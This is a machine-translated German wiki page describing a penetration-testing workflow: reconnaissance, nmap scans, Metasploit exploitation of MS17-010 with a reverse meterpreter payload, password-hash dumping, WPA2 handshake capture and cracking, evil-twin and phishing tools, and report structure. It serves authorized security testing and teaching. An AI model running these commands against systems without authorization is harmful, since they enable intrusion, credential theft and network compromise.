---
title: "Penetrationstest-Methodik"
category: techniques
tags: [security, pentesting, reconnaissance, exploitation, metasploit, nmap]
level: 3
source_sha256: 680bd03966524cf720e37019447dfe8e29bda3821286f218011f776e0a392731
translation: machine
translated_at: '2026-10-24'
---
# Penetrationstest-Methodik {#penetration-testing-methodology}

End-to-End-Workflow für Penetrationstests: Reconnaissance (passiv und aktiv), Scanning, Exploitation mit Metasploit, Post-Exploitation und professionelles Reporting. Behandelt Angriffsvektoren auf Infrastruktur, Netzwerk und WLAN.

## Wichtige Fakten {#key-facts}
- Pentesting-Phasen: Recon -> Scanning -> Exploitation -> Post-Exploitation -> Reporting
- Passive Recon (Shodan, DNS, OSINT) ist für das Ziel nicht erkennbar
- nmap-SYN-Scan (`-sS`) ist der Standard-Stealth-Scan mit Root-Rechten
- Staged Payloads in Metasploit sind kleiner, benötigen aber einen Callback; Stageless Payloads sind eigenständig
- Reverse Shells umgehen Ingress-Firewalls (das Ziel baut die Verbindung zum Angreifer auf)
- Report-Struktur: Executive Summary -> Scope -> Findings (nach Schweregrad sortiert) -> Evidence -> Remediation

## Reconnaissance {#reconnaissance}

### Passiv (ohne Kontakt zum Ziel) {#passive-no-target-contact}
```bash
# DNS enumeration
dig example.com ANY
dig axfr @ns1.example.com example.com   # Zone transfer attempt
dnsenum example.com

# Subdomain discovery
sublist3r -d example.com
amass enum -d example.com

# Email/IP harvesting
theHarvester -d example.com -b google,bing,linkedin -l 500
```

Weitere passive Quellen: Shodan, Certificate Transparency (crt.sh), WHOIS, Google-Dorking (`site:example.com filetype:pdf`).

### Aktiv (erkennbar) {#active-detectable}
Port-Scanning, Banner-Grabbing, Directory-Brute-Forcing:
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

## Scanning {#scanning}

### nmap {#nmap}
```bash
nmap -sS target              # SYN scan (stealth, requires root)
nmap -sT target              # TCP connect (no root needed)
nmap -sU target              # UDP scan
nmap -sV target              # Service version detection
nmap -O target               # OS detection
nmap -A target               # Aggressive (OS + version + scripts + traceroute)
nmap -p- target              # All 65535 ports
nmap -sn 10.0.0.0/24        # Host discovery only (ping sweep)
nmap -Pn target              # Skip host discovery

# NSE Scripts
nmap --script vuln target                    # All vulnerability scripts
nmap --script smb-vuln-ms17-010 target       # Specific CVE check
nmap --script http-enum target               # HTTP directory enum
nmap --script "smb-*" target                 # All SMB scripts
```

### Schwachstellen-Scanning {#vulnerability-scanning}
- **Nessus** - kommerziell, am weitesten verbreitet
- **OpenVAS/GVM** - Open-Source-Alternative
- Authentifizierte Scans sind deutlich gründlicher als nicht authentifizierte
- Das Management von False Positives ist entscheidend - vor dem Reporting verifizieren

## Exploitation {#exploitation}

### Metasploit Framework {#metasploit-framework}
```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter post-exploitation
sysinfo                              # System info
getuid / getsystem                   # Current user / privesc attempt
hashdump                             # Dump password hashes
shell                                # OS shell
upload /local/file /remote/path
download /remote/file /local/path
portfwd add -l 8080 -p 80 -r 10.0.0.10   # Port forwarding
```

### Payload-Typen {#payload-types}
- **Staged** (`windows/meterpreter/reverse_tcp`) - kleiner Stager lädt das vollständige Payload nach
- **Stageless** (`windows/meterpreter_reverse_tcp`) - vollständiges Payload in einer einzigen Binary
- **Reverse Shell** - das Ziel baut die Verbindung zum Angreifer auf (umgeht Ingress-Firewall)
- **Bind Shell** - das Ziel öffnet einen Port, der Angreifer verbindet sich

## Wireless-Angriffe {#wireless-attacks}

### WPA2-Cracking {#wpa2-cracking}
```bash
airmon-ng start wlan0                           # Monitor mode
airodump-ng wlan0mon                            # Discover networks
airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon  # Target capture
aireplay-ng -0 5 -a BSSID wlan0mon             # Deauth (force handshake)
aircrack-ng -w wordlist.txt capture-01.cap     # Crack

# GPU-accelerated cracking
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Rogue AP / Evil Twin {#rogue-ap-evil-twin}
Legitimen AP-SSID klonen, Captive Portal ausliefern, um Zugangsdaten abzugreifen. Tools: hostapd + dnsmasq.

## Social Engineering {#social-engineering}
- **Spear Phishing** - gezielte E-Mails mit schädlichen Links/Anhängen
- **Whaling** - Angriff auf Führungskräfte
- **Vishing** - telefonisches Social Engineering
- **Pretexting** - erfundenes Szenario (Vortäuschung einer IT- oder Lieferantenidentität)
- Tools: GoPhish, King Phisher

## Berichtserstellung {#report-writing}

### Schweregrad von Findings {#finding-severity}
| Schweregrad | Beispiele |
|----------|----------|
| Critical | RCE, Authentifizierungsumgehung, Kompromittierung von Domain-Admins |
| High | Privilege Escalation, Offenlegung sensibler Daten, SQLi |
| Medium | Stored XSS, CSRF, Informationsoffenlegung |
| Low | Fehlende Header, ausführliche Fehlermeldungen, veraltete Software (ohne bekannten Exploit) |
| Info | Empfehlungen zu Best Practices |

Jedes Finding benötigt: Beschreibung, geschäftliches Risiko, schrittweise Remediation und Verifizierungsschritte.

## Gotchas {#gotchas}
- Vor jedem Test immer eine schriftliche Autorisierung (Scope, Rules of Engagement) einholen
- Die Ausnutzung einer Schwachstelle kann den Dienst zum Absturz bringen - nach Möglichkeit in Wartungsfenstern testen
- Standard-Payloads von Metasploit werden von den meisten AV/EDR-Lösungen erkannt - für echte Engagements sind angepasste bzw. kodierte Payloads nötig
- Nicht authentifizierte nmap-Scans übersehen viele Schwachstellen, die authentifizierte Scans finden
- Netzwerk-Scans können IDS/IPS-Alarme und automatische Sperren (fail2ban) auslösen

## Siehe auch {#see-also}
- [[privilege-escalation-techniques]] - Privilege Escalation unter Linux und Windows
- [[active-directory-attacks]] - AD-spezifische Angriffspfade
- [[burp-suite-and-web-pentesting]] - Webanwendungstests
- [[osint-and-reconnaissance]] - passive Informationsbeschaffung
